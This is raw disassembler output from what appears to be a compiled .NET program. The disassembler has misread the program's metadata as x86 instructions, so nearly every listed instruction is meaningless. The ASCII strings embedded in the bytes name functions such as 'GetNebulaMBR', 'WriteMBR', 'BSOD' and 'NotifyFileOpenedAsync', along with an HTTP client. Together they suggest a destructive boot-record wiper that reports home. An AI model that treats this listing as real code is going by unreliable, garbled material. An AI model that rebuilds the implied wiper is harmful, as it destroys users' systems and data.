  402bb7:	00 b6 02 00 00 01    	add    %dh,0x1000002(%esi)
  402bbd:	00 ce                	add    %cl,%dh
  402bbf:	02 00                	add    (%eax),%al
  402bc1:	00 02                	add    %al,(%edx)
  402bc3:	00 02                	add    %al,(%edx)
  402bc5:	07                   	pop    %es
  402bc6:	00 00                	add    %al,(%eax)
  402bc8:	03 00                	add    (%eax),%eax
  402bca:	9f                   	lahf
  402bcb:	03 02                	add    (%edx),%eax
  402bcd:	00 04 00             	add    %al,(%eax,%eax,1)
  402bd0:	46                   	inc    %esi
  402bd1:	06                   	push   %es
  402bd2:	00 00                	add    %al,(%eax)
  402bd4:	05 00 d9 01 00       	add    $0x1d900,%eax
  402bd9:	00 01                	add    %al,(%ecx)
  402bdb:	00 87 01 00 00 01    	add    %al,0x1000001(%edi)
  402be1:	00 a3 08 00 00 02    	add    %ah,0x2000008(%ebx)
  402be7:	00 64 08 00          	add    %ah,0x0(%eax,%ecx,1)
  402beb:	00 03                	add    %al,(%ebx)
  402bed:	00 df                	add    %bl,%bh
  402bef:	05 00 00 04 00       	add    $0x40000,%eax
  402bf4:	6c                   	insb   (%dx),%es:(%edi)
  402bf5:	08 00                	or     %al,(%eax)
  402bf7:	00 05 00 8a 06 02    	add    %al,0x2068a00
  402bfd:	00 06                	add    %al,(%esi)
  402bff:	00 7c 03 00          	add    %bh,0x0(%ebx,%eax,1)
  402c03:	00 01                	add    %al,(%ecx)
  402c05:	00 61 02             	add    %ah,0x2(%ecx)
  402c08:	00 00                	add    %al,(%eax)
  402c0a:	02 00                	add    (%eax),%al
  402c0c:	6b 02 00             	imul   $0x0,(%edx),%eax
  402c0f:	00 03                	add    %al,(%ebx)
  402c11:	00 c3                	add    %al,%bl
  402c13:	01 02                	add    %eax,(%edx)
  402c15:	00 04 00             	add    %al,(%eax,%eax,1)
  402c18:	d1 01                	roll   $1,(%ecx)
  402c1a:	00 00                	add    %al,(%eax)
  402c1c:	01 00                	add    %eax,(%eax)
  402c1e:	39 08                	cmp    %ecx,(%eax)
  402c20:	00 00                	add    %al,(%eax)
  402c22:	01 00                	add    %eax,(%eax)
  402c24:	39 08                	cmp    %ecx,(%eax)
  402c26:	00 00                	add    %al,(%eax)
  402c28:	01 00                	add    %eax,(%eax)
  402c2a:	1a 06                	sbb    (%esi),%al
  402c2c:	00 00                	add    %al,(%eax)
  402c2e:	01 00                	add    %eax,(%eax)
  402c30:	65 03 00             	add    %gs:(%eax),%eax
  402c33:	00 01                	add    %al,(%ecx)
  402c35:	00 65 03             	add    %ah,0x3(%ebp)
  402c38:	00 00                	add    %al,(%eax)
  402c3a:	01 00                	add    %eax,(%eax)
  402c3c:	65 03 08             	add    %gs:(%eax),%ecx
  402c3f:	00 5d 00             	add    %bl,0x0(%ebp)
  402c42:	09 00                	or     %eax,(%eax)
  402c44:	5d                   	pop    %ebp
  402c45:	00 0a                	add    %cl,(%edx)
  402c47:	00 5d 00             	add    %bl,0x0(%ebp)
  402c4a:	09 00                	or     %eax,(%eax)
  402c4c:	76 07                	jbe    0x402c55
  402c4e:	01 00                	add    %eax,(%eax)
  402c50:	11 00                	adc    %eax,(%eax)
  402c52:	76 07                	jbe    0x402c5b
  402c54:	06                   	push   %es
  402c55:	00 19                	add    %bl,(%ecx)
  402c57:	00 76 07             	add    %dh,0x7(%esi)
  402c5a:	0a 00                	or     (%eax),%al
  402c5c:	29 00                	sub    %eax,(%eax)
  402c5e:	76 07                	jbe    0x402c67
  402c60:	10 00                	adc    %al,(%eax)
  402c62:	31 00                	xor    %eax,(%eax)
  402c64:	76 07                	jbe    0x402c6d
  402c66:	10 00                	adc    %al,(%eax)
  402c68:	39 00                	cmp    %eax,(%eax)
  402c6a:	76 07                	jbe    0x402c73
  402c6c:	10 00                	adc    %al,(%eax)
  402c6e:	41                   	inc    %ecx
  402c6f:	00 76 07             	add    %dh,0x7(%esi)
  402c72:	10 00                	adc    %al,(%eax)
  402c74:	49                   	dec    %ecx
  402c75:	00 76 07             	add    %dh,0x7(%esi)
  402c78:	10 00                	adc    %al,(%eax)
  402c7a:	51                   	push   %ecx
  402c7b:	00 76 07             	add    %dh,0x7(%esi)
  402c7e:	10 00                	adc    %al,(%eax)
  402c80:	59                   	pop    %ecx
  402c81:	00 76 07             	add    %dh,0x7(%esi)
  402c84:	10 00                	adc    %al,(%eax)
  402c86:	61                   	popa
  402c87:	00 76 07             	add    %dh,0x7(%esi)
  402c8a:	15 00 69 00 76       	adc    $0x76006900,%eax
  402c8f:	07                   	pop    %es
  402c90:	10 00                	adc    %al,(%eax)
  402c92:	71 00                	jno    0x402c94
  402c94:	76 07                	jbe    0x402c9d
  402c96:	10 00                	adc    %al,(%eax)
  402c98:	79 00                	jns    0x402c9a
  402c9a:	76 07                	jbe    0x402ca3
  402c9c:	10 00                	adc    %al,(%eax)
  402c9e:	99                   	cltd
  402c9f:	00 76 07             	add    %dh,0x7(%esi)
  402ca2:	1a 00                	sbb    (%eax),%al
  402ca4:	a9 00 76 07 06       	test   $0x6077600,%eax
  402ca9:	00 b9 00 08 09 06    	add    %bh,0x6090800(%ecx)
  402caf:	00 b9 00 55 03 20    	add    %bh,0x20035500(%ecx)
  402cb5:	00 e1                	add    %ah,%cl
  402cb7:	00 76 07             	add    %dh,0x7(%esi)
  402cba:	06                   	push   %es
  402cbb:	00 19                	add    %bl,(%ecx)
  402cbd:	01 bc 06 2c 00 21 01 	add    %edi,0x121002c(%esi,%eax,1)
  402cc4:	0d 02 2f 00 29       	or     $0x29002f02,%eax
  402cc9:	01 85 03 06 00 39    	add    %eax,0x39000603(%ebp)
  402ccf:	01 3e                	add    %edi,(%esi)
  402cd1:	09 39                	or     %edi,(%ecx)
  402cd3:	00 41 01             	add    %al,0x1(%ecx)
  402cd6:	9b                   	fwait
  402cd7:	05 43 00 81 00       	add    $0x810043,%eax
  402cdc:	76 07                	jbe    0x402ce5
  402cde:	06                   	push   %es
  402cdf:	00 d9                	add    %bl,%cl
  402ce1:	00 8d 03 56 00 d9    	add    %cl,-0x26ffa9fd(%ebp)
  402ce7:	00 02                	add    %al,(%edx)
  402ce9:	09 5b 00             	or     %ebx,0x0(%ebx)
  402cec:	d9 00                	flds   (%eax)
  402cee:	fa                   	cli
  402cef:	05 68 00 a1 00       	add    $0xa10068,%eax
  402cf4:	54                   	push   %esp
  402cf5:	07                   	pop    %es
  402cf6:	81 00 c9 00 c9 08    	addl   $0x8c900c9,(%eax)
  402cfc:	06                   	push   %es
  402cfd:	00 e9                	add    %ch,%cl
  402cff:	00 76 07             	add    %dh,0x7(%esi)
  402d02:	06                   	push   %es
  402d03:	00 51 01             	add    %dl,0x1(%ecx)
  402d06:	91                   	xchg   %eax,%ecx
  402d07:	08 9b 00 51 01 d4    	or     %bl,-0x2bfeaf00(%ebx)
  402d0d:	02 a1 00 59 01 14    	add    0x14015900(%ecx),%ah
  402d13:	03 a7 00 61 01 3c    	add    0x3c016100(%edi),%esp
  402d19:	07                   	pop    %es
  402d1a:	ab                   	stos   %eax,%es:(%edi)
  402d1b:	00 c1                	add    %al,%cl
  402d1d:	00 4e 09             	add    %cl,0x9(%esi)
  402d20:	af                   	scas   %es:(%edi),%eax
  402d21:	00 69 01             	add    %ch,0x1(%ecx)
  402d24:	af                   	scas   %es:(%edi),%eax
  402d25:	08 b5 00 c1 00 81    	or     %dh,-0x7eff3f00(%ebp)
  402d2b:	05 bc 00 71 01       	add    $0x17100bc,%eax
  402d30:	76 07                	jbe    0x402d39
  402d32:	06                   	push   %es
  402d33:	00 71 01             	add    %dh,0x1(%ecx)
  402d36:	21 03                	and    %eax,(%ebx)
  402d38:	10 00                	adc    %al,(%eax)
  402d3a:	71 01                	jno    0x402d3d
  402d3c:	68 05 15 00 71       	push   $0x71001505
  402d41:	01 25 09 15 00 71    	add    %esp,0x71001509
  402d47:	01 f1                	add    %esi,%ecx
  402d49:	02 c2                	add    %dl,%al
  402d4b:	00 51 01             	add    %dl,0x1(%ecx)
  402d4e:	02 09                	add    (%ecx),%cl
  402d50:	c9                   	leave
  402d51:	00 a1 00 38 09 d2    	add    %ah,-0x2df6c800(%ecx)
  402d57:	00 c9                	add    %cl,%cl
  402d59:	00 fd                	add    %bh,%ch
  402d5b:	01 2f                	add    %ebp,(%edi)
  402d5d:	00 d9                	add    %bl,%cl
  402d5f:	00 e6                	add    %ah,%dh
  402d61:	01 d8                	add    %ebx,%eax
  402d63:	00 c1                	add    %al,%cl
  402d65:	00 33                	add    %dh,(%ebx)
  402d67:	02 10                	add    (%eax),%dl
  402d69:	00 d9                	add    %bl,%cl
  402d6b:	00 9e 06 ea 00 d9    	add    %bl,-0x26ff15fa(%esi)
  402d71:	00 d3                	add    %dl,%bl
  402d73:	08 06                	or     %al,(%esi)
  402d75:	00 d9                	add    %bl,%cl
  402d77:	00 55 03             	add    %dl,0x3(%ebp)
  402d7a:	20 00                	and    %al,(%eax)
  402d7c:	81 01 5f 07 17 01    	addl   $0x117075f,(%ecx)
  402d82:	e9 00 0c 09 1e       	jmp    0x1e493987
  402d87:	01 81 01 c4 08 24    	add    %eax,0x2408c401(%ecx)
  402d8d:	01 f1                	add    %esi,%ecx
  402d8f:	00 1d 09 29 01 f1    	add    %bl,0xf1012909
  402d95:	00 d6                	add    %dl,%dh
  402d97:	05 2e 01 69 01       	add    $0x169012e,%eax
  402d9c:	b6 08                	mov    $0x8,%dh
  402d9e:	33 01                	xor    (%ecx),%eax
  402da0:	69 01 1f 02 3a 01    	imul   $0x13a021f,(%ecx),%eax
  402da6:	09 01                	or     %eax,(%ecx)
  402da8:	76 07                	jbe    0x402db1
  402daa:	06                   	push   %es
  402dab:	00 91 01 f7 00 40    	add    %dl,0x4000f701(%ecx)
  402db1:	01 11                	add    %edx,(%ecx)
  402db3:	01 76 07             	add    %esi,0x7(%esi)
  402db6:	46                   	inc    %esi
  402db7:	01 09                	add    %ecx,(%ecx)
  402db9:	01 b9 01 4f 01 0c    	add    %edi,0xc014f01(%ecx)
  402dbf:	00 54 07 67          	add    %dl,0x67(%edi,%eax,1)
  402dc3:	01 14 00             	add    %edx,(%eax,%eax,1)
  402dc6:	fd                   	std
  402dc7:	01 2f                	add    %ebp,(%edi)
  402dc9:	00 14 00             	add    %dl,(%eax,%eax,1)
  402dcc:	c9                   	leave
  402dcd:	08 84 01 a9 01 85 03 	or     %al,0x38501a9(%ecx,%eax,1)
  402dd4:	06                   	push   %es
  402dd5:	00 a1 01 85 03 06    	add    %ah,0x6038501(%ecx)
  402ddb:	00 09                	add    %cl,(%ecx)
  402ddd:	00 04 00             	add    %al,(%eax,%eax,1)
  402de0:	9b                   	fwait
  402de1:	01 09                	add    %ecx,(%ecx)
  402de3:	00 08                	add    %cl,(%eax)
  402de5:	00 a0 01 09 00 0c    	add    %ah,0xc000901(%eax)
  402deb:	00 a5 01 09 00 10    	add    %ah,0x10000901(%ebp)
  402df1:	00 aa 01 2e 00 0b    	add    %ch,0xb002e01(%edx)
  402df7:	00 2e                	add    %ch,(%esi)
  402df9:	02 2e                	add    (%esi),%ch
  402dfb:	00 13                	add    %dl,(%ebx)
  402dfd:	00 37                	add    %dh,(%edi)
  402dff:	02 2e                	add    (%esi),%ch
  402e01:	00 1b                	add    %bl,(%ebx)
  402e03:	00 56 02             	add    %dl,0x2(%esi)
  402e06:	2e 00 23             	add    %ah,%cs:(%ebx)
  402e09:	00 5f 02             	add    %bl,0x2(%edi)
  402e0c:	2e 00 2b             	add    %ch,%cs:(%ebx)
  402e0f:	00 71 02             	add    %dh,0x2(%ecx)
  402e12:	2e 00 33             	add    %dh,%cs:(%ebx)
  402e15:	00 71 02             	add    %dh,0x2(%ecx)
  402e18:	2e 00 3b             	add    %bh,%cs:(%ebx)
  402e1b:	00 71 02             	add    %dh,0x2(%ecx)
  402e1e:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  402e22:	5f                   	pop    %edi
  402e23:	02 2e                	add    (%esi),%ch
  402e25:	00 4b 00             	add    %cl,0x0(%ebx)
  402e28:	77 02                	ja     0x402e2c
  402e2a:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  402e2e:	71 02                	jno    0x402e32
  402e30:	2e 00 5b 00          	add    %bl,%cs:0x0(%ebx)
  402e34:	71 02                	jno    0x402e38
  402e36:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  402e3a:	8f 02                	pop    (%edx)
  402e3c:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  402e40:	b9 02 2e 00 73       	mov    $0x73002e02,%ecx
  402e45:	00 c6                	add    %al,%dh
  402e47:	02 c0                	add    %al,%al
  402e49:	00 7b 00             	add    %bh,0x0(%ebx)
  402e4c:	14 03                	adc    $0x3,%al
  402e4e:	e3 00                	jecxz  0x402e50
  402e50:	83 00 a0             	addl   $0xffffffa0,(%eax)
  402e53:	01 03                	add    %eax,(%ebx)
  402e55:	01 83 00 a0 01 23    	add    %eax,0x2301a000(%ebx)
  402e5b:	01 83 00 a0 01 40    	add    %eax,0x4001a000(%ebx)
  402e61:	01 7b 00             	add    %edi,0x0(%ebx)
  402e64:	34 03                	xor    $0x3,%al
  402e66:	43                   	inc    %ebx
  402e67:	01 83 00 a0 01 c0    	add    %eax,-0x3ffe6000(%ebx)
  402e6d:	01 7b 00             	add    %edi,0x0(%ebx)
  402e70:	59                   	pop    %ecx
  402e71:	03 20                	add    (%eax),%esp
  402e73:	02 9b 00 a0 01 60    	add    0x6001a000(%ebx),%bl
  402e79:	02 9b 00 a0 01 a0    	add    -0x5ffe6000(%ebx),%bl
  402e7f:	02 9b 00 a0 01 01    	add    0x101a000(%ebx),%bl
  402e85:	00 fe                	add    %bh,%dh
  402e87:	01 00                	add    %eax,(%eax)
  402e89:	00 0b                	add    %cl,(%ebx)
  402e8b:	00 26                	add    %ah,(%esi)
  402e8d:	00 33                	add    %dh,(%ebx)
  402e8f:	00 51 00             	add    %dl,0x0(%ecx)
  402e92:	6d                   	insl   (%dx),%es:(%edi)
  402e93:	00 72 00             	add    %dh,0x0(%edx)
  402e96:	7c 00                	jl     0x402e98
  402e98:	86 00                	xchg   %al,(%eax)
  402e9a:	90                   	nop
  402e9b:	00 f0                	add    %dh,%al
  402e9d:	00 01                	add    %al,(%ecx)
  402e9f:	01 08                	add    %ecx,(%eax)
  402ea1:	00 20                	add    %ah,(%eax)
  402ea3:	00 23                	add    %ah,(%ebx)
  402ea5:	00 08                	add    %cl,(%eax)
  402ea7:	00 22                	add    %ah,(%edx)
  402ea9:	00 25 00 09 00 24    	add    %ah,0x24000900
  402eaf:	00 23                	add    %ah,(%ebx)
  402eb1:	00 09                	add    %cl,(%ecx)
  402eb3:	00 26                	add    %ah,(%esi)
  402eb5:	00 25 00 0a 00 28    	add    %ah,0x28000a00
  402ebb:	00 23                	add    %ah,(%ebx)
  402ebd:	00 0a                	add    %cl,(%edx)
  402ebf:	00 2a                	add    %ch,(%edx)
  402ec1:	00 25 00 03 06 10    	add    %ah,0x10060300
  402ec7:	06                   	push   %es
  402ec8:	5e                   	pop    %esi
  402ec9:	01 70 01             	add    %esi,0x1(%eax)
  402ecc:	40                   	inc    %eax
  402ecd:	01 03                	add    %eax,(%ebx)
  402ecf:	00 ab 02 01 00 40    	add    %ch,0x40000102(%ebx)
  402ed5:	01 05 00 c4 02 01    	add    %eax,0x102c400
  402edb:	00 40 01             	add    %al,0x1(%eax)
  402ede:	0f 00 65 07          	verr   0x7(%ebp)
  402ee2:	02 00                	add    (%eax),%al
  402ee4:	40                   	inc    %eax
  402ee5:	01 11                	add    %edx,(%ecx)
  402ee7:	00 58 02             	add    %bl,0x2(%eax)
  402eea:	02 00                	add    (%eax),%al
  402eec:	30 3f                	xor    %bh,(%edi)
  402eee:	00 00                	add    %al,(%eax)
  402ef0:	07                   	pop    %es
  402ef1:	00 04 80             	add    %al,(%eax,%eax,4)
  402ef4:	00 00                	add    %al,(%eax)
  402ef6:	01 00                	add    %eax,(%eax)
	...
  402f04:	1c 07                	sbb    $0x7,%al
  402f06:	00 00                	add    %al,(%eax)
  402f08:	04 00                	add    $0x0,%al
	...
  402f12:	00 00                	add    %al,(%eax)
  402f14:	89 01                	mov    %eax,(%ecx)
  402f16:	8f 01                	pop    (%ecx)
  402f18:	00 00                	add    %al,(%eax)
  402f1a:	00 00                	add    %al,(%eax)
  402f1c:	04 00                	add    $0x0,%al
  402f1e:	02 00                	add    (%eax),%al
	...
  402f28:	92                   	xchg   %eax,%edx
  402f29:	01 c1                	add    %eax,%ecx
  402f2b:	06                   	push   %es
  402f2c:	00 00                	add    %al,(%eax)
  402f2e:	00 00                	add    %al,(%eax)
  402f30:	04 00                	add    $0x0,%al
	...
  402f3a:	00 00                	add    %al,(%eax)
  402f3c:	89 01                	mov    %eax,(%ecx)
  402f3e:	2d 06 00 00 00       	sub    $0x6,%eax
  402f43:	00 08                	add    %cl,(%eax)
  402f45:	00 03                	add    %al,(%ebx)
  402f47:	00 09                	add    %cl,(%ecx)
  402f49:	00 05 00 0a 00 06    	add    %al,0x6000a00
  402f4f:	00 0b                	add    %cl,(%ebx)
  402f51:	00 07                	add    %al,(%edi)
  402f53:	00 31                	add    %dh,(%ecx)
  402f55:	00 4d 00             	add    %cl,0x0(%ebp)
  402f58:	37                   	aaa
  402f59:	00 63 00             	add    %ah,0x0(%ebx)
  402f5c:	37                   	aaa
  402f5d:	00 77 00             	add    %dh,0x0(%edi)
  402f60:	37                   	aaa
  402f61:	00 8b 00 5f 00 e3    	add    %cl,-0x1cffa100(%ebx)
  402f67:	00 5f 00             	add    %bl,0x0(%edi)
  402f6a:	fa                   	cli
  402f6b:	00 5f 00             	add    %bl,0x0(%edi)
  402f6e:	78 01                	js     0x402f71
  402f70:	00 00                	add    %al,(%eax)
  402f72:	00 00                	add    %al,(%eax)
  402f74:	00 5f 5f             	add    %bl,0x5f(%edi)
  402f77:	53                   	push   %ebx
  402f78:	74 61                	je     0x402fdb
  402f7a:	74 69                	je     0x402fe5
  402f7c:	63 41 72             	arpl   %eax,0x72(%ecx)
  402f7f:	72 61                	jb     0x402fe2
  402f81:	79 49                	jns    0x402fcc
  402f83:	6e                   	outsb  %ds:(%esi),(%dx)
  402f84:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  402f8b:	69 
  402f8c:	7a 65                	jp     0x402ff3
  402f8e:	3d 35 31 30 00       	cmp    $0x303135,%eax
  402f93:	31 38                	xor    %edi,(%eax)
  402f95:	36 38 34 38          	cmp    %dh,%ss:(%eax,%edi,1)
  402f99:	38 43 39             	cmp    %al,0x39(%ebx)
  402f9c:	33 35 35 43 31 34    	xor    0x34314335,%esi
  402fa2:	37                   	aaa
  402fa3:	41                   	inc    %ecx
  402fa4:	31 37                	xor    %esi,(%edi)
  402fa6:	32 43 37             	xor    0x37(%ebx),%al
  402fa9:	34 37                	xor    $0x37,%al
  402fab:	42                   	inc    %edx
  402fac:	30 32                	xor    %dh,(%edx)
  402fae:	46                   	inc    %esi
  402faf:	41                   	inc    %ecx
  402fb0:	44                   	inc    %esp
  402fb1:	30 38                	xor    %bh,(%eax)
  402fb3:	42                   	inc    %edx
  402fb4:	36 45                	ss inc %ebp
  402fb6:	44                   	inc    %esp
  402fb7:	31 42 30             	xor    %eax,0x30(%edx)
  402fba:	34 43                	xor    $0x43,%al
  402fbc:	43                   	inc    %ebx
  402fbd:	42                   	inc    %edx
  402fbe:	45                   	inc    %ebp
  402fbf:	31 34 34             	xor    %esi,(%esp,%esi,1)
  402fc2:	38 31                	cmp    %dh,(%ecx)
  402fc4:	36 46                	ss inc %esi
  402fc6:	33 31                	xor    (%ecx),%esi
  402fc8:	33 38                	xor    (%eax),%edi
  402fca:	45                   	inc    %ebp
  402fcb:	38 30                	cmp    %dh,(%eax)
  402fcd:	30 46 39             	xor    %al,0x39(%esi)
  402fd0:	37                   	aaa
  402fd1:	41                   	inc    %ecx
  402fd2:	30 00                	xor    %al,(%eax)
  402fd4:	3c 53                	cmp    $0x53,%al
  402fd6:	74 61                	je     0x403039
  402fd8:	72 74                	jb     0x40304e
  402fda:	41                   	inc    %ecx
  402fdb:	73 79                	jae    0x403056
  402fdd:	6e                   	outsb  %ds:(%esi),(%dx)
  402fde:	63 3e                	arpl   %edi,(%esi)
  402fe0:	64 5f                	fs pop %edi
  402fe2:	5f                   	pop    %edi
  402fe3:	30 00                	xor    %al,(%eax)
  402fe5:	3c 4e                	cmp    $0x4e,%al
  402fe7:	6f                   	outsl  %ds:(%esi),(%dx)
  402fe8:	74 69                	je     0x403053
  402fea:	66 79 46             	data16 jns 0x403033
  402fed:	69 6c 65 4f 70 65 6e 	imul   $0x656e6570,0x4f(%ebp,%eiz,2),%ebp
  402ff4:	65 
  402ff5:	64 41                	fs inc %ecx
  402ff7:	73 79                	jae    0x403072
  402ff9:	6e                   	outsb  %ds:(%esi),(%dx)
  402ffa:	63 3e                	arpl   %edi,(%esi)
  402ffc:	64 5f                	fs pop %edi
  402ffe:	5f                   	pop    %edi
  402fff:	31 00                	xor    %eax,(%eax)
  403001:	3c 4d                	cmp    $0x4d,%al
  403003:	61                   	popa
  403004:	69 6e 3e 64 5f 5f 31 	imul   $0x315f5f64,0x3e(%esi),%ebp
  40300b:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  40300e:	75 5f                	jne    0x40306f
  403010:	5f                   	pop    %edi
  403011:	31 00                	xor    %eax,(%eax)
  403013:	54                   	push   %esp
  403014:	61                   	popa
  403015:	73 6b                	jae    0x403082
  403017:	60                   	pusha
  403018:	31 00                	xor    %eax,(%eax)
  40301a:	54                   	push   %esp
  40301b:	61                   	popa
  40301c:	73 6b                	jae    0x403089
  40301e:	41                   	inc    %ecx
  40301f:	77 61                	ja     0x403082
  403021:	69 74 65 72 60 31 00 	imul   $0x4d003160,0x72(%ebp,%eiz,2),%esi
  403028:	4d 
  403029:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  403030:	74 2e                	je     0x403060
  403032:	57                   	push   %edi
  403033:	69 6e 33 32 00 49 6e 	imul   $0x6e490032,0x33(%esi),%ebp
  40303a:	74 33                	je     0x40306f
  40303c:	32 00                	xor    (%eax),%al
  40303e:	3c 72                	cmp    $0x72,%al
  403040:	65 67 50             	gs addr16 push %eax
  403043:	61                   	popa
  403044:	74 68                	je     0x4030ae
  403046:	3e 35 5f 5f 32 00    	ds xor $0x325f5f,%eax
  40304c:	3c 63                	cmp    $0x63,%al
  40304e:	6c                   	insb   (%dx),%es:(%edi)
  40304f:	69 65 6e 74 3e 35 5f 	imul   $0x5f353e74,0x6e(%ebp),%esp
  403056:	5f                   	pop    %edi
  403057:	32 00                	xor    (%eax),%al
  403059:	3c 68                	cmp    $0x68,%al
  40305b:	74 74                	je     0x4030d1
  40305d:	70 43                	jo     0x4030a2
  40305f:	6f                   	outsl  %ds:(%esi),(%dx)
  403060:	6e                   	outsb  %ds:(%esi),(%dx)
  403061:	74 65                	je     0x4030c8
  403063:	6e                   	outsb  %ds:(%esi),(%dx)
  403064:	74 3e                	je     0x4030a4
  403066:	35 5f 5f 33 00       	xor    $0x335f5f,%eax
  40306b:	67 65 74 5f          	addr16 gs je 0x4030ce
  40306f:	55                   	push   %ebp
  403070:	54                   	push   %esp
  403071:	46                   	inc    %esi
  403072:	38 00                	cmp    %al,(%eax)
  403074:	3c 4d                	cmp    $0x4d,%al
  403076:	6f                   	outsl  %ds:(%esi),(%dx)
  403077:	64 75 6c             	fs jne 0x4030e6
  40307a:	65 3e 00 3c 4d 61 69 	gs add %bh,%ds:0x3e6e6961(,%ecx,2)
  403081:	6e 3e 
  403083:	00 3c 50             	add    %bh,(%eax,%edx,2)
  403086:	72 69                	jb     0x4030f1
  403088:	76 61                	jbe    0x4030eb
  40308a:	74 65                	je     0x4030f1
  40308c:	49                   	dec    %ecx
  40308d:	6d                   	insl   (%dx),%es:(%edi)
  40308e:	70 6c                	jo     0x4030fc
  403090:	65 6d                	gs insl (%dx),%es:(%edi)
  403092:	65 6e                	outsb  %gs:(%esi),(%dx)
  403094:	74 61                	je     0x4030f7
  403096:	74 69                	je     0x403101
  403098:	6f                   	outsl  %ds:(%esi),(%dx)
  403099:	6e                   	outsb  %ds:(%esi),(%dx)
  40309a:	44                   	inc    %esp
  40309b:	65 74 61             	gs je  0x4030ff
  40309e:	69 6c 73 3e 00 46 49 	imul   $0x4c494600,0x3e(%ebx,%esi,2),%ebp
  4030a5:	4c 
  4030a6:	45                   	inc    %ebp
  4030a7:	5f                   	pop    %edi
  4030a8:	53                   	push   %ebx
  4030a9:	48                   	dec    %eax
  4030aa:	41                   	inc    %ecx
  4030ab:	52                   	push   %edx
  4030ac:	45                   	inc    %ebp
  4030ad:	5f                   	pop    %edi
  4030ae:	52                   	push   %edx
  4030af:	45                   	inc    %ebp
  4030b0:	41                   	inc    %ecx
  4030b1:	44                   	inc    %esp
  4030b2:	00 42 53             	add    %al,0x53(%edx)
  4030b5:	4f                   	dec    %edi
  4030b6:	44                   	inc    %esp
  4030b7:	00 47 45             	add    %al,0x45(%edi)
  4030ba:	4e                   	dec    %esi
  4030bb:	45                   	inc    %ebp
  4030bc:	52                   	push   %edx
  4030bd:	49                   	dec    %ecx
  4030be:	43                   	inc    %ebx
  4030bf:	5f                   	pop    %edi
  4030c0:	57                   	push   %edi
  4030c1:	52                   	push   %edx
  4030c2:	49                   	dec    %ecx
  4030c3:	54                   	push   %esp
  4030c4:	45                   	inc    %ebp
  4030c5:	00 46 49             	add    %al,0x49(%esi)
  4030c8:	4c                   	dec    %esp
  4030c9:	45                   	inc    %ebp
  4030ca:	5f                   	pop    %edi
  4030cb:	53                   	push   %ebx
  4030cc:	48                   	dec    %eax
  4030cd:	41                   	inc    %ecx
  4030ce:	52                   	push   %edx
  4030cf:	45                   	inc    %ebp
  4030d0:	5f                   	pop    %edi
  4030d1:	57                   	push   %edi
  4030d2:	52                   	push   %edx
  4030d3:	49                   	dec    %ecx
  4030d4:	54                   	push   %esp
  4030d5:	45                   	inc    %ebp
  4030d6:	00 4f 50             	add    %cl,0x50(%edi)
  4030d9:	45                   	inc    %ebp
  4030da:	4e                   	dec    %esi
  4030db:	5f                   	pop    %edi
  4030dc:	45                   	inc    %ebp
  4030dd:	58                   	pop    %eax
  4030de:	49                   	dec    %ecx
  4030df:	53                   	push   %ebx
  4030e0:	54                   	push   %esp
  4030e1:	49                   	dec    %ecx
  4030e2:	4e                   	dec    %esi
  4030e3:	47                   	inc    %edi
  4030e4:	00 47 65             	add    %al,0x65(%edi)
  4030e7:	74 4e                	je     0x403137
  4030e9:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  4030ed:	61                   	popa
  4030ee:	4d                   	dec    %ebp
  4030ef:	42                   	inc    %edx
  4030f0:	52                   	push   %edx
  4030f1:	00 57 72             	add    %dl,0x72(%edi)
  4030f4:	69 74 65 4d 42 52 00 	imul   $0x6d005242,0x4d(%ebp,%eiz,2),%esi
  4030fb:	6d 
  4030fc:	62 72 44             	bound  %esi,0x44(%edx)
  4030ff:	61                   	popa
  403100:	74 61                	je     0x403163
  403102:	00 6d 73             	add    %ch,0x73(%ebp)
  403105:	63 6f 72             	arpl   %ebp,0x72(%edi)
  403108:	6c                   	insb   (%dx),%es:(%edi)
  403109:	69 62 00 4e 6f 74 69 	imul   $0x69746f4e,0x0(%edx),%esp
  403110:	66 79 46             	data16 jns 0x403159
  403113:	69 6c 65 4f 70 65 6e 	imul   $0x656e6570,0x4f(%ebp,%eiz,2),%ebp
  40311a:	65 
  40311b:	64 41                	fs inc %ecx
  40311d:	73 79                	jae    0x403198
  40311f:	6e                   	outsb  %ds:(%esi),(%dx)
  403120:	63 00                	arpl   %eax,(%eax)
  403122:	53                   	push   %ebx
  403123:	74 61                	je     0x403186
  403125:	72 74                	jb     0x40319b
  403127:	41                   	inc    %ecx
  403128:	73 79                	jae    0x4031a3
  40312a:	6e                   	outsb  %ds:(%esi),(%dx)
  40312b:	63 00                	arpl   %eax,(%eax)
  40312d:	50                   	push   %eax
  40312e:	6f                   	outsl  %ds:(%esi),(%dx)
  40312f:	73 74                	jae    0x4031a5
  403131:	41                   	inc    %ecx
  403132:	73 79                	jae    0x4031ad
  403134:	6e                   	outsb  %ds:(%esi),(%dx)
  403135:	63 00                	arpl   %eax,(%eax)
  403137:	43                   	inc    %ebx
  403138:	75 72                	jne    0x4031ac
  40313a:	72 65                	jb     0x4031a1
  40313c:	6e                   	outsb  %ds:(%esi),(%dx)
  40313d:	74 54                	je     0x403193
  40313f:	68 72 65 61 64       	push   $0x64616572
  403144:	00 45 6e             	add    %al,0x6e(%ebp)
  403147:	61                   	popa
  403148:	62 6c 65 64          	bound  %ebp,0x64(%ebp,%eiz,2)
  40314c:	00 6c 70 4f          	add    %ch,0x4f(%eax,%esi,2)
  403150:	76 65                	jbe    0x4031b7
  403152:	72 6c                	jb     0x4031c0
  403154:	61                   	popa
  403155:	70 70                	jo     0x4031c7
  403157:	65 64 00 41 77       	gs add %al,%fs:0x77(%ecx)
  40315c:	61                   	popa
  40315d:	69 74 55 6e 73 61 66 	imul   $0x65666173,0x6e(%ebp,%edx,2),%esi
  403164:	65 
  403165:	4f                   	dec    %edi
  403166:	6e                   	outsb  %ds:(%esi),(%dx)
  403167:	43                   	inc    %ebx
  403168:	6f                   	outsl  %ds:(%esi),(%dx)
  403169:	6d                   	insl   (%dx),%es:(%edi)
  40316a:	70 6c                	jo     0x4031d8
  40316c:	65 74 65             	gs je  0x4031d4
  40316f:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  403173:	74 5f                	je     0x4031d4
  403175:	49                   	dec    %ecx
  403176:	73 43                	jae    0x4031bb
